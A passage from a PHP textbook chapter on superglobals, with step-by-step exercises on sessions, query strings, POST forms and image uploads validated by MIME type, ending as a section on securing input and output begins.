			<p>Displaying cookie value on a Chrome DevTools window.</p>
			<div>
				<div class="IMG---Figure" id="_idContainer141">
					<img alt="Figure 6.12 The ref cookie value displayed in a Chrome DevTools window.&#13;&#10;" src="image/C14196_06_12.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.12 The ref cookie value displayed in a Chrome DevTools window.</p>
			<p>Now the URL contains no query string, meaning that our script has nothing to process. The cookie data is sent through, since it was set on the previous request, and is displayed on the browser page for each HTTP request.</p>
			<h2 id="_idParaDest-224"><a id="_idTextAnchor231"/>$_SESSION</h2>
			<p><strong class="source-inline">$_SESSION</strong> has nothing to do with the HTTP request, yet it is a very important variable, as it holds the <strong class="source-inline">state data</strong> of a user; that is, keeping certain data across subsequent requests. Compared to cookies, the session data is stored on the server; therefore, the data is not accessible by the client. Session data is used to store logged-in user data (at least the ID) and temporary data (such as flash messages, CSRF tokens, shopping cart items, and more).</p>
			<p>To store an entry in a session, it is enough to add it to the <strong class="source-inline">$_SESSION</strong> superglobal associative array, like this: <strong class="source-inline">$_SESSION['user_id'] = 123;</strong>.</p>
			<p>By default, PHP will not start the session automatically, meaning it will not generate a session ID and will not set the cookie header with the session ID value. So, you have to call <strong class="source-inline">session_start()</strong> in order to initialize the session. PHP will then try to load the session ID stored in the <strong class="source-inline">PHPSESSID</strong> variable (which is the default name) from the <strong class="bold">Cookie</strong> request header and, if such an entry name does not exist, then a fresh session will be started and the session ID will be sent back to the client with the current response in the headers. </p>
			<h2 id="_idParaDest-225"><a id="_idTextAnchor232"/>Exercise 6.3: Writing and Reading Data from a Session</h2>
			<p>In this exercise, we will implement session initialization and write and read data from a session. If the session is opening for the first time, then we will save random data to check that the session is preserving saved data for subsequent requests. The random data will be saved in the <strong class="source-inline">name</strong> key of the <strong class="source-inline">$_SESSION</strong> variable. Here are the steps to perform the exercise:</p>
			<ol>
				<li value="1">Create a file called <strong class="source-inline">session.php</strong>.</li>
				<li>Write the code to start the session and display the <strong class="source-inline">Cannot start the session</strong> string if the <strong class="source-inline">session_start()</strong> function does not return <strong class="source-inline">TRUE</strong>:<p class="source-code">if (!session_start()) {</p><p class="source-code">    echo 'Cannot start the session.';</p><p class="source-code">    return;</p><p class="source-code">}</p><p>To work with sessions in PHP, you are required to <em class="italic">start the session</em>. This will perform a series of operations, such as generating the session ID and creating a session file where the data will be stored or connecting to the data provider service, depending on the settings of the <strong class="source-inline">ini</strong> files. If the session cannot start, then there's no reason to continue, so we will display an error message and stop the script execution.</p><p>If the session is started, we may want to grab the session name – this is the name under which the ID is saved in cookies. The default session name is <strong class="source-inline">PHPSESSID</strong>.</p></li>
				<li>Write the code to grab the session name:<p class="source-code">$sessionName = session_name(); // PHPSESSID by default</p></li>
				<li>If the session was not initialized (that is, there is no cookie with the <strong class="source-inline">PHPSESSID</strong> variable), we may want to inform the user about that using the following code:<p class="source-code">echo sprintf('&lt;p&gt;The cookie with session name [%s] does not exist.&lt;/p&gt;',   $sessionName);</p></li>
				<li>Additionally, print the fresh session ID that is saved under the <strong class="source-inline">$sessionName</strong> cookie entry using the following code:<p class="source-code">echo sprintf(</p><p class="source-code">    '&lt;p&gt;A new cookie will be set for session name [%s], with value [%s]      &lt;/p&gt;',</p><p class="source-code">    $sessionName,</p><p class="source-code">    session_id()</p><p class="source-code">);</p><p>The <strong class="source-inline">session_id()</strong> function returns the current session ID that belongs to the user that is accessing the page only. It is generated each time <strong class="source-inline">session_start()</strong> is invoked and, at the same time, no cookie with the session ID is found in the HTTP request.</p><p class="callout-heading">Note</p><p class="callout">We don't need to use a function to set the cookie with the generated session ID. This is done automatically when invoking <strong class="source-inline">session_start()</strong>.</p><p>Choosing a random value from an indexed array should be easy using the <strong class="source-inline">rand()</strong> function. <strong class="source-inline">rand()</strong> will return a randomly picked number between a given minimum and maximum as an argument. In our case, for three values in an array, we need an index between 0 and 2. </p></li>
				<li>Store the random entry in a session under the <strong class="source-inline">name</strong> key using the following code:<p class="source-code">$names = [</p><p class="source-code">    "A-Bomb (HAS)",</p><p class="source-code">    "Captain America",</p><p class="source-code">    "Black Panther",</p><p class="source-code">];</p><p class="source-code">$chosen = $names[rand(0, 2)];</p><p class="source-code">$_SESSION['name'] = $chosen;</p></li>
				<li>Print a message letting us know about the saved value in the session and the headers that are sent to the browser (to see the <strong class="source-inline">Set-Cookie</strong> header that saves the session ID in the browser):<p class="source-code">echo sprintf('&lt;p&gt;The name [%s] was picked and stored in current session.  &lt;/p&gt;', $chosen);</p><p class="source-code">echo sprintf('List of headers to send in response: &lt;pre&gt;%s&lt;/pre&gt;',   implode("\n", headers_list()));</p></li>
				<li>We have seen what to do when the session is not initialized yet. Now, if the session is already initialized, we will print the session name and the session ID (the value from the request cookies), and we will also dump the session data:<p class="source-code">echo sprintf('&lt;p&gt;The cookie with session name [%s] and value [%s] ' .</p><p class="source-code">    'is set in browser, and sent to script.&lt;/p&gt;', $sessionName,       $_COOKIE[$sessionName]);</p><p class="source-code">echo sprintf('&lt;p&gt;The current session has the following data:   &lt;pre&gt;%s&lt;/pre&gt;&lt;/p&gt;', var_export($_SESSION, true));</p><p class="callout-heading">Note</p><p class="callout">Once the session is initialized, this will display the same data for each subsequent request, and all the changes performed in the user session data will also be reflected in subsequent requests. The session data can be considered as a storage unit for a user, just like cookies, but on the server side – the link between the client and the server is made using the session ID.</p><p>The whole script file can be referred at <a href="https://packt.live/31gZKAe">https://packt.live/31gZKAe</a>.</p></li>
				<li>Access the file through the built-in server at <strong class="source-inline">http://127.0.0.1:8080/session.php</strong>.<p>The first output will look like this:</p><div class="IMG---Figure" id="_idContainer142"><img alt="Figure 6.13: First access of session.php – initializing the new session and cookie set&#13;&#10;" src="image/C14196_06_13.jpg"/></div><p class="figure-caption">Figure 6.13: First access of session.php – initializing the new session and cookie set</p><p>The cookie values look as follows:</p><div class="IMG---Figure" id="_idContainer143"><img alt="Figure 6.14: Cookie values in Chrome DevTools after the /session.php page was accessed&#13;&#10;" src="image/C14196_06_14.jpg"/></div><p class="figure-caption">Figure 6.14: Cookie values in Chrome DevTools after the /session.php page was accessed</p></li>
				<li>Refresh the page; the output should look like this:<div class="IMG---Figure" id="_idContainer144"><img alt="Figure 6.15: Subsequent access of session.php – the session data restored with the ID from the cookie&#13;&#10;" src="image/C14196_06_15.jpg"/></div><p class="figure-caption">Figure 6.15: Subsequent access of session.php – the session data restored with the ID from the cookie</p><p class="callout-heading">Note</p><p class="callout">Since the actual value in the <strong class="source-inline">$names</strong> array is picked randomly, the value seen might be one of the three possible</p></li>
				<li>Clear the cookies for the current page and reload the page. Notice that a different session ID is generated and set when no <strong class="source-inline">PHPSESSID</strong> cookie is already set.<p>Here is the explanation of the script: first, the script will try to start the session, and it will look for the session ID in a cookie. Next, the script will check whether such a cookie exists, using the <strong class="source-inline">session_name()</strong> function to get the name the session uses, from which it will store and fetch the session ID. If a cookie with such a name is found, then its value will be printed and the session data will be printed as well. Otherwise, it will inform you about the session ID that was generated and is set to be stored in a cookie, and a random character name will be picked and stored in the current session. Additionally, a list of headers to be sent in the response is printed, to make sure the (session) set-cookie header is sent. </p><p class="callout-heading">Note</p><p class="callout">Learn more about session functions at <a href="https://packt.live/31x8MJC">https://packt.live/31x8MJC</a>.</p></li>
			</ol>
			<h2 id="_idParaDest-226"><a id="_idTextAnchor233"/>$_GET</h2>
			<p><strong class="source-inline">$_GET</strong> carries the parsed query string of a request URI, no matter the request method. Therefore, a URI such as <strong class="source-inline">/?page=2</strong> would result in the following <strong class="source-inline">$_GET</strong> value: <strong class="source-inline">["page" =&gt; 2]</strong>. PHP can parse a query string into nested arrays as well, so a query string such as <strong class="source-inline">tags[]=heroes&amp;tags[]=2019</strong> would lead to a value of <strong class="source-inline">$_GET</strong>, such as <strong class="source-inline">[ "tags" =&gt; [ 0 =&gt; "heroes", 1 =&gt; "2019" ] ]</strong>, parsing tags into a numerical array. You can use a query string to parse into an associative array as well; just put names between the square brackets. For example, <strong class="source-inline">filter[category]=heroes&amp;filter[year]=2019</strong> would be parsed as <strong class="source-inline">[ "filter" =&gt; [ "category"=&gt; "heroes", "year"=&gt; "2019" ] ]</strong>.</p>
			<h2 id="_idParaDest-227"><a id="_idTextAnchor234"/>Exercise 6.4: Using Query Strings in Web Pages</h2>
			<p>In this exercise, we will build HTTP query strings, use them in web page links, and also use query string data. More precisely, you will use <strong class="source-inline">$_GET</strong> to select and display a specific data entry from a list.</p>
			<p>Here are the steps to complete the exercise:</p>
			<ol>
				<li value="1">Create a file called <strong class="source-inline">super-get-href.php</strong> and define a list of values in an associative array where keys are the entry IDs, and with nested associative arrays as values, with the <strong class="source-inline">id</strong> and <strong class="source-inline">name</strong> keys:<p class="source-code">// define the data</p><p class="source-code">$heroes = [</p><p class="source-code">    "a-bomb" =&gt; [</p><p class="source-code">        "id" =&gt; 1017100,</p><p class="source-code">        "name" =&gt; "A-Bomb (HAS)",</p><p class="source-code">    ],</p><p class="source-code">    "captain-america" =&gt; [</p><p class="source-code">        "id" =&gt; 1009220,</p><p class="source-code">        "name" =&gt; "Captain America",</p><p class="source-code">    ],</p><p class="source-code">    "black-panther" =&gt; [</p><p class="source-code">        "id" =&gt; 1009187,</p><p class="source-code">        "name" =&gt; "Black Panther",</p><p class="source-code">    ],</p><p class="source-code">];</p><p>We will need the query string to point out which entry the script should pick, so let's assume the value we are looking for in the query string is under the <strong class="source-inline">hero</strong> name. So, to get the character ID, the <strong class="source-inline">$heroId = $_GET['hero'];</strong> name would do the trick. Then, picking the character entry from our <strong class="source-inline">$heroes</strong> list should look like this: <strong class="source-inline">$selectedHero = $heroes[$heroId];</strong>. Here, <strong class="source-inline">$selectedHero</strong> is the entry, like <strong class="source-inline">["id" =&gt; 1009187, "name" =&gt; "Black Panther"]</strong> in the case where <strong class="source-inline">$heroId</strong> is <strong class="source-inline">black-panther</strong>.</p></li>
				<li>Add a <strong class="source-inline">$selectedHero</strong> variable initialization and check for the presence of the <strong class="source-inline">hero</strong> entry in <strong class="source-inline">$_GET</strong>; the code should look like this:<p class="source-code">$selectedHero = [];</p><p class="source-code">if (array_key_exists('hero', $_GET)) {</p><p class="source-code">    if (array_key_exists($_GET['hero'], $heroes)) {</p><p class="source-code">        $heroId = $_GET['hero'];</p><p class="source-code">        $selectedHero = $heroes[$heroId];</p><p class="source-code">    }</p><p class="source-code">}</p></li>
				<li>Before we display the character data, we will check whether the <strong class="source-inline">$selectedHero</strong> variable has values. If no values can be found in <strong class="source-inline">$selectedHero</strong>, it means no <strong class="source-inline">hero</strong> was specified in the query string parameter, or the value does not exist in the <strong class="source-inline">$heroes</strong> key list; therefore, we can display a plain <strong class="source-inline">None</strong>:<p class="source-code">&lt;div style="background: #eee"&gt;</p><p class="source-code">    &lt;p&gt;Selected hero:&lt;/p&gt;</p><p class="source-code">    &lt;?php if ($selectedHero) { ?&gt;</p><p class="source-code">        &lt;h3&gt;&lt;?= $selectedHero['name'] ?&gt;&lt;/h3&gt;</p><p class="source-code">        &lt;h4&gt;ID: &lt;?= $selectedHero['id'] ?&gt;&lt;/h4&gt;</p><p class="source-code">    &lt;?php } else { ?&gt;</p><p class="source-code">        &lt;p&gt;None.&lt;/p&gt;</p><p class="source-code">    &lt;?php } ?&gt;</p><p class="source-code">&lt;/div&gt;</p></li>
				<li>For debugging purposes, we might want to dump the <strong class="source-inline">$_GET</strong> value. We can use <strong class="source-inline">var_export</strong> for this:<p class="source-code">&lt;p&gt;The value of $_GET is:&lt;/p&gt;</p><p class="source-code">&lt;pre&gt;&lt;?= var_export($_GET, true); ?&gt;&lt;/pre&gt;</p></li>
				<li>Now, it would be very useful to have some links on the page, one for each <strong class="source-inline">$heroes</strong> entry, to contain the <strong class="source-inline">hero</strong> query string parameter. We can add the code we need to build the link to a function, to avoid repeating the same logic over and over again in the same script. Let's call that function <strong class="source-inline">path()</strong>, and allow it to accept an associative array that will be used to build the query string part of the URL. We will use the built-in <strong class="source-inline">http_build_query()</strong> function to generate the query string based on input data; for example, <strong class="source-inline">['name' =&gt; 'john']</strong> will generate the <strong class="source-inline">name=john</strong> query string. This will be appended to the script filename (in our case, this is <strong class="source-inline">super-get-href.php</strong>):<p class="source-code">function path(array $queryData)</p><p class="source-code">{</p><p class="source-code">    return sprintf('./super-get-href.php?%s', http_build_      query($queryData));</p><p class="source-code">}</p></li>
				<li>To create the HTML link, we will have to iterate the <strong class="source-inline">$heroes</strong> array and render an <strong class="source-inline">&lt;a&gt;</strong> element for each character, using the <strong class="source-inline">path()</strong> function to generate the <strong class="source-inline">href</strong> attribute value. Since we are looking into <strong class="source-inline">$_GET['hero']</strong> for the character ID, the argument for the <strong class="source-inline">path()</strong> function should be <strong class="source-inline">['hero' =&gt; $heroId]</strong>. All the links will be collected in the <strong class="source-inline">$heroLinks</strong> variable:<p class="source-code">$heroLinks = [];</p><p class="source-code">foreach ($heroes as $heroId =&gt; $heroData) {</p><p class="source-code">    $heroLinks[] = sprintf('&lt;a href="%s"&gt;%s&lt;/a&gt;',       path(['hero' =&gt; $heroId]), $heroData['name']);</p><p class="source-code">}</p></li>
				<li>To print the link, using the double forward slash (<strong class="source-inline">//</strong>) separator, we can use the <strong class="source-inline">implode()</strong> array function to join all the entries using a separator:<p class="source-code">echo sprintf('&lt;p&gt;%s&lt;/p&gt;', implode(' // ', $heroLinks));</p><p class="callout-heading">Note</p><p class="callout">We will group the PHP logic on top of the script file and the HTML markup under it. You can refer to the complete file at <a href="https://packt.live/35xfmDd">https://packt.live/35xfmDd</a>.</p></li>
				<li>Now access the file in your browser through the built-in server at <strong class="source-inline">http://127.0.0.1:8080/super-get-href.php</strong>.<p>As the output, in the first line, you will have the links with character names, and below, you will find the value of the <strong class="source-inline">$_GET</strong> superglobal, which is an empty array:</p><div class="IMG---Figure" id="_idContainer145"><img alt="Figure 6.16: Accessing the super-get-href.php script without query string parameters&#13;&#10;" src="image/C14196_06_16.jpg"/></div><p class="figure-caption">Figure 6.16: Accessing the super-get-href.php script without query string parameters</p></li>
				<li>Now feel free to click on the links and watch what happens to the URL and the value of the <strong class="source-inline">$_GET</strong> variable. For example, clicking on the <strong class="source-inline">Black Panther</strong> link, you will notice the <strong class="source-inline">http://127.0.0.1:8080/super-get-href.php?hero=black-panther</strong> URL, and the content will look like this:</li>
			</ol>
			<div>
				<div class="IMG---Figure" id="_idContainer146">
					<img alt="Figure 6.17: Displaying the page after clicking on the “Black Panther” link&#13;&#10;" src="image/C14196_06_17.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.17: Displaying the page after clicking on the "Black Panther" link</p>
			<h2 id="_idParaDest-228"><a id="_idTextAnchor235"/>$_POST</h2>
			<p><strong class="source-inline">$_POST</strong> carries the <strong class="source-inline">POST</strong> request data (that is, the URL-encoded or multipart form data). It is the same as for the query string; for example, when <strong class="source-inline">reset=all</strong> is sent in the <strong class="source-inline">POST</strong> payload, the output of <strong class="source-inline">echo $_POST['reset']</strong> will be <strong class="source-inline">all</strong>.</p>
			<p>The <strong class="source-inline">POST</strong> data is sent from the browser using HTML forms. The <strong class="source-inline">POST</strong> method is usually used to alter data in an application, either to create, to update, or to delete data; to move data; to trigger remote actions; or to change the session state, to name a few.</p>
			<h2 id="_idParaDest-229"><a id="_idTextAnchor236"/>Exercise 6.5: Sending and Reading POST Data</h2>
			<p>In this exercise, you will send <strong class="source-inline">POST</strong> data using an HTML form and manage this data in a PHP script. Following the previous example, let's keep the same data in the <strong class="source-inline">$heroes</strong> variable; however, instead of using links, we will use a form to send the data using the <strong class="source-inline">POST</strong> method.</p>
			<p>Perform the following steps to complete the exercise:</p>
			<ol>
				<li value="1">Create a file called <strong class="source-inline">super-post-form.php</strong> with the following content.</li>
				<li>Just like in the previous exercise, we'll define an associative array with three entries, with URI-friendly IDs for characters as array keys, and character data (as associative arrays as well) as values. Add the following data to the <strong class="source-inline">$heroes</strong> variable:<p class="source-code">// define the data</p><p class="source-code">$heroes = [</p><p class="source-code">    "a-bomb" =&gt; [</p><p class="source-code">        "id" =&gt; 1017100,</p><p class="source-code">        "name" =&gt; "A-Bomb (HAS)",</p><p class="source-code">    ],</p><p class="source-code">    "captain-america" =&gt; [</p><p class="source-code">        "id" =&gt; 1009220,</p><p class="source-code">        "name" =&gt; "Captain America",</p><p class="source-code">    ],</p><p class="source-code">    "black-panther" =&gt; [</p><p class="source-code">        "id" =&gt; 1009187,</p><p class="source-code">        "name" =&gt; "Black Panther",</p><p class="source-code">    ],</p><p class="source-code">];</p></li>
				<li>Selecting a character entry is done the same as in the previous example, with the difference that we are now looking at the <strong class="source-inline">$_POST</strong> superglobal instead of the <strong class="source-inline">$_GET</strong> method of the previous exercise:<p class="source-code">$selectedHero = [];</p><p class="source-code">// process the post request, if any</p><p class="source-code">if (array_key_exists('hero', $_POST)) {</p><p class="source-code">    if (array_key_exists($_POST['hero'], $heroes)) {</p><p class="source-code">        $heroId = $_POST['hero'];</p><p class="source-code">        $selectedHero = $heroes[$heroId];</p><p class="source-code">    }</p><p class="source-code">}</p></li>
				<li>To display the selected character, we will keep the same format and logic from the previous exercise:<p class="source-code">&lt;div style="background: #eee"&gt;</p><p class="source-code">    &lt;p&gt;Selected hero:&lt;/p&gt;</p><p class="source-code">    &lt;?php if ($selectedHero) { ?&gt;</p><p class="source-code">        &lt;h3&gt;&lt;?= $selectedHero['name'] ?&gt;&lt;/h3&gt;</p><p class="source-code">        &lt;h4&gt;ID: &lt;?= $selectedHero['id'] ?&gt;&lt;/h4&gt;</p><p class="source-code">    &lt;?php } else { ?&gt;</p><p class="source-code">        &lt;p&gt;None.&lt;/p&gt;</p><p class="source-code">    &lt;?php } ?&gt;</p><p class="source-code">&lt;/div&gt;</p></li>
				<li>Also, for debugging purposes, we will dump the <strong class="source-inline">$_POST</strong> values:<p class="source-code">&lt;p&gt;The value of $_POST is:&lt;/p&gt;</p><p class="source-code">&lt;pre&gt;&lt;?= var_export($_POST, true); ?&gt;&lt;/pre&gt;</p></li>
				<li>To use the POST method to end data, we will use a <strong class="source-inline">&lt;form&gt;</strong> element with a <strong class="source-inline">&lt;select&gt;</strong> element. The <strong class="source-inline">&lt;select&gt;</strong> element will contain the <strong class="source-inline">&lt;option&gt;</strong> with the character ID as a value and the character name as a label:<p class="source-code">&lt;form action="./super-post-form.php" method="post"   enctype="application/x-www-form-urlencoded"&gt;</p><p class="source-code">    &lt;label for="hero_select"&gt;Select your hero: &lt;/label&gt;</p><p class="source-code">    &lt;select name="hero" id="hero_select"&gt;</p><p class="source-code">        &lt;?php foreach ($heroes as $heroId =&gt; $heroData) { ?&gt;</p><p class="source-code">            &lt;option value="&lt;?= $heroId ?&gt;"&gt;&lt;?= $heroData['name'] ?&gt;              &lt;/option&gt;</p><p class="source-code">        &lt;?php } ?&gt;</p><p class="source-code">    &lt;/select&gt;</p><p class="source-code">    &lt;input type="submit" value="Show"&gt;</p><p class="source-code">&lt;/form&gt;</p></li>
				<li>Open the file in the browser at <strong class="source-inline">http://127.0.0.1:8080/super-post-form.php</strong>.<p>The output should look like this:</p><div class="IMG---Figure" id="_idContainer147"><img alt="Figure 6.18: First access to the super-post-form.php script&#13;&#10;" src="image/C14196_06_18.jpg"/></div><p class="figure-caption">Figure 6.18: First access to the super-post-form.php script</p></li>
				<li>Select the <strong class="source-inline">Captain America</strong> item in the <strong class="source-inline">&lt;select&gt;</strong> element and click on the <strong class="source-inline">Show</strong> button.<p>The output is now as follows:</p></li>
			</ol>
			<div>
				<div class="IMG---Figure" id="_idContainer148">
					<img alt="Figure 6.19: Displaying the super-post-form.php script result after submitting the form&#13;&#10;" src="image/C14196_06_19.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.19: Displaying the super-post-form.php script result after submitting the form</p>
			<p>Notice the new content on the page, and also take a look at the URL – there is no longer a query string since the data is sent in the HTTP request body. As you might notice, this is the same as for the <strong class="source-inline">$_GET</strong> variable – it's just the input source that is different. In addition to this, notice that the <strong class="source-inline">&lt;select&gt;</strong> element displays the <strong class="source-inline">A-Bomb (HAS)</strong> value; this is because there is no <strong class="source-inline">&lt;option&gt;</strong> with the <strong class="source-inline">selected</strong> attribute set, and the <strong class="source-inline">&lt;select&gt;</strong> element defaults to the first option as the selected option.</p>
			<h2 id="_idParaDest-230"><a id="_idTextAnchor237"/>$_FILES</h2>
			<p>The<strong class="source-inline"> $_FILES</strong> superglobal contains data for upload attempts, meaning uploads are not considered successful if their related data is found in this variable. The reason for failed attempts varies, and a list of reasons (or upload statuses) can be found on the official PHP documentation page (<a href="https://packt.live/32hXhH2">https://packt.live/32hXhH2</a>). All the uploaded files are stored in a temporary location until the application scripts move them to persistent storage. <strong class="source-inline">$_FILES</strong> is an associative array with the form of an input name as an entry key and the upload information as an entry value. The upload information is another associative array with the following fields: <strong class="source-inline">name</strong>, <strong class="source-inline">tmp_name</strong>, <strong class="source-inline">type</strong>, <strong class="source-inline">size</strong>, and <strong class="source-inline">error</strong>. </p>
			<p>The <strong class="source-inline">name</strong> field will have the file's base name sent with the request; <strong class="source-inline">tmp_name</strong> will have the temporary location of the uploaded file (so that your script can move it to the appropriate place); <strong class="source-inline">type</strong> will have the media type of the file (the MIME type) sent by the client in the same request; <strong class="source-inline">size</strong> will be the file size in bytes; and <strong class="source-inline">error</strong> will have information about the upload status. Note that the <em class="italic">specified media type in type </em><strong class="source-inline">key</strong><em class="italic"> is not the file extension as it appears on the operating system's filesystem.</em></p>
			<p class="callout-heading">Caution</p>
			<p class="callout">As a good practice, it is recommended that you use built-in functions or other appropriate tools to detect the MIME type of a file; therefore, do not trust the user input – do always test it. By default, the uploaded file size limit is 2 MB, and the POST payload limit is 8 MB (for the whole request).</p>
			<h2 id="_idParaDest-231"><a id="_idTextAnchor238"/>Exercise 6.6: Uploading a File and Validating its Type</h2>
			<p>In this exercise, we will upload an image, validate the uploaded file by detecting its MIME type, and then display the successfully uploaded image in the browser. </p>
			<p>Here are the steps to perform the exercise:</p>
			<ol>
				<li value="1">Create a file called <strong class="source-inline">super-post-upload.php</strong>.<p>Before we try uploading the file, we should define the upload location, the destination file path, and, to be able to display it in the browser, the file's relative path to the server document root directory (in our case, the document root is the directory where the script file is running). </p></li>
				<li>We will use a static filename for the upload target so that we can save and display a single image, not a list of them:<p class="source-code">$uploadsDir = __DIR__ . DIRECTORY_SEPARATOR . 'uploads';</p><p class="source-code">$targetFilename = $uploadsDir . DIRECTORY_SEPARATOR . 'my-image.png';</p><p class="source-code">$relativeFilename = substr($targetFilename, strlen(__DIR__));</p><p>The <strong class="source-inline">$relativeFilename</strong> relative file path, unlike the target file path, is not the full file path on the disk; it is instead just the path relative to the current directory that is the server document root, where the script is run. In order to achieve this, we use the built-in <strong class="source-inline">substr()</strong> function to subtract the string from the target file path, starting with the string in the <strong class="source-inline">strlen(__DIR__)</strong> position, meaning the part from the target file path to the current directory will be cut.</p></li>
				<li>Make sure <strong class="source-inline">$uploadsDir</strong> is a valid path on the disk; create the <strong class="source-inline">uploads</strong> directory if it does not exist.</li>
				<li>Since the uploaded files (or upload attempts) are stored in the <strong class="source-inline">$_FILES</strong> variable, we will check the watched entry in it. Let's suppose we expect a file under the <strong class="source-inline">uploadFile</strong> input name; then, we can perform the check with <strong class="source-inline">array_key_exists('uploadFile', $_FILES)</strong>. Eventually, the <strong class="source-inline">$_FILES['uploadFile']</strong> value will be stored in the <strong class="source-inline">$uploadInfo</strong> variable to make it more convenient to work with the uploaded file information:<p class="source-code">if (array_key_exists('uploadFile', $_FILES)) {</p><p class="source-code">    $uploadInfo = $_FILES['uploadFile'];</p></li>
				<li>Next, we want to make sure the upload was completed successfully. The upload status is stored in the <strong class="source-inline">error</strong> entry, as stated before, so we may want to use a <strong class="source-inline">switch</strong> statement to jump to the status of the upload, using the <strong class="source-inline">UPLOAD_ERR_*</strong> constant for the <strong class="source-inline">case</strong> value. The beginning of the <strong class="source-inline">switch</strong> statement should look like this:<p class="source-code">    switch ($uploadInfo['error']) {</p><p class="source-code">        case UPLOAD_ERR_OK:</p></li>
				<li>In the case of a successful upload, we should validate the input data. What we care about the most is the MIME type of the content the server got from the client and, to check whether it's the expected one, we use the built-in <strong class="source-inline">mime_content_type()</strong> function. Let's suppose that we only allow PNG images to be uploaded, as follows:<p class="source-code">mime_content_type($uploadInfo['tmp_name']); // we expect 'image/png'</p></li>
				<li>After the validation passes, we should move the file from the temporary location to the <strong class="source-inline">$targetFilename</strong> destination that we defined earlier, and we will use the <strong class="source-inline">move_uploaded_file()</strong> function for that. This function takes the temporary path of the uploaded file as the first argument and the target as the second argument. It returns <strong class="source-inline">TRUE</strong> if successful:<p class="source-code">move_uploaded_file($uploadInfo['tmp_name'], $targetFilename);</p><p class="callout-heading">Caution</p><p class="callout">Avoid using the <strong class="source-inline">rename()</strong> filesystem function for this operation, due to security implications. <strong class="source-inline">move_uploaded_file()</strong> is much better to use in this context because it will only proceed if the file to be moved is an uploaded file in the current request.</p></li>
				<li>We will add the case of the exceeding file size (<strong class="source-inline">UPLOAD_ERR_INI_SIZE</strong>) and the missing file for the upload operation (<strong class="source-inline">UPLOAD_ERR_NO_FILE</strong>), and print a custom error message for each:<p class="source-code">case UPLOAD_ERR_INI_SIZE:</p><p class="source-code">    echo sprintf('Failed to upload [%s]: the file is too big.',       $uploadInfo['name']);</p><p class="source-code">    break;</p><p class="source-code">case UPLOAD_ERR_NO_FILE:</p><p class="source-code">    echo 'No file was uploaded.';</p><p class="source-code">    break;</p></li>
				<li>For other status types, let's add a generic message displaying the error code:<p class="source-code">default:</p><p class="source-code">    echo sprintf('Failed to upload [%s]: error code [%d].',       $uploadInfo['name'], $uploadInfo['error']);</p><p class="source-code">    break;</p></li>
				<li>To upload a file from a web page, we have to add the upload form on that web page, including the <strong class="source-inline">&lt;input&gt;</strong> of type <strong class="source-inline">file</strong> and the <strong class="source-inline">"uploadFile"</strong> name (which we are watching in the script). The form requires the <strong class="source-inline">enctype</strong> attribute with the <strong class="source-inline">"multipart/form-data"</strong> value:<p class="source-code">&lt;form action="./super-post-upload.php" method="post"   enctype="multipart/form-data"&gt;</p><p class="source-code">    &lt;input type="file" name="uploadFile"&gt;</p><p class="source-code">    &lt;input type="submit" value="Upload"&gt;</p><p class="source-code">&lt;/form&gt;</p></li>
				<li>After handling the file upload, let's display the image after it's uploaded. First, we will have to check whether the file exists, and we do this by using the built-in filesystem function, <strong class="source-inline">file_exists()</strong>:<p class="source-code">if (file_exists($targetFilename)) {</p><p class="source-code">    // print the file</p><p class="source-code">}</p></li>
				<li>To display the image in the browser, we should render an HTML <strong class="source-inline">&lt;img&gt;</strong> element with the relative path to the server document root in the <strong class="source-inline">src</strong> attribute:<p class="source-code">echo sprintf('&lt;img src="%s" style="max-width: 500px; height: auto;"   alt="my uploaded image"&gt;', $relativeFilename);</p></li>
				<li>Open the file in your browser at <strong class="source-inline">http://127.0.0.1:8080/super-post-upload.php</strong>.<p>The output should be a file upload form only:</p><div class="IMG---Figure" id="_idContainer149"><img alt="Figure 6.20: The file upload form&#13;&#10;" src="image/C14196_06_20.jpg"/></div><p class="figure-caption">Figure 6.20: The file upload form</p></li>
				<li>Click on <strong class="source-inline">Upload</strong> without selecting a file. This time, an error message will be displayed before the form. The output should look like this:<div class="IMG---Figure" id="_idContainer150"><img alt="Figure 6.21: File upload error when no file is submitted&#13;&#10;" src="image/C14196_06_21.jpg"/></div><p class="figure-caption">Figure 6.21: File upload error when no file is submitted</p><p>We got a <strong class="source-inline">No file was uploaded.</strong> error since <strong class="source-inline">$uploadInfo['error']</strong> had the value of <strong class="source-inline">UPLOAD_ERR_NO_FILE</strong> due to the missing file in the form upload input.</p></li>
				<li>Select a big file (that is, bigger than 2 MB) and hit the <strong class="source-inline">Upload</strong> button. This time, another error message will warn you about the exceeded size limit for the uploaded file:<div class="IMG---Figure" id="_idContainer151"><img alt="" src="image/C14196_06_22.jpg"/></div><p class="figure-caption">Figure 6.22: File upload error when the submitted file is too big</p><p>Similar to the previous step, we got an upload error. This time the upload error was <strong class="source-inline">UPLOAD_ERR_INI_SIZE</strong>.</p></li>
				<li>Select a file that is under 2 MB and non-PNG and hit the <strong class="source-inline">Upload</strong> button. Yet another error message will appear telling you that the file format is not the accepted format:<div class="IMG---Figure" id="_idContainer152"><img alt="Figure 6.23: File upload error when the submitted file is not the accepted format&#13;&#10;" src="image/C14196_06_23.jpg"/></div><p class="figure-caption">Figure 6.23: File upload error when the submitted file is not the accepted format</p><p>Unlike in previous steps, the upload error this time was <strong class="source-inline">UPLOAD_ERR_OK</strong>, which means no error occurred with the upload. The error message displayed on the page is caused by the file MIME type validation, which is required to be <strong class="source-inline">image/png</strong>.</p></li>
				<li>Finally, select a PNG image file that is smaller than 2 MB and hit the <strong class="source-inline">Upload</strong> button. The page should display the successful upload message and render the uploaded picture:</li>
			</ol>
			<div>
				<div class="IMG---Figure" id="_idContainer153">
					<img alt="Figure 6.24: File upload success when the submitted file meets the requirements&#13;&#10;" src="image/C14196_06_24.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.24: File upload success when the submitted file meets the requirements</p>
			<p>Since the upload happened without errors, and the MIME file type is the expected one, the file gets stored on the designated path on the server and is displayed on the browser page.</p>
			<h2 id="_idParaDest-232"><a id="_idTextAnchor239"/>Securing Input and Output Data</h2>
			<p>In order to protect your website's users and the website itself, you should protect your web applications from malicious input and operations. Application security is one of the pillars of a reliable application. This should not be overlooked; on the contrary, you must have security in mind all the time while developing an app. </p>
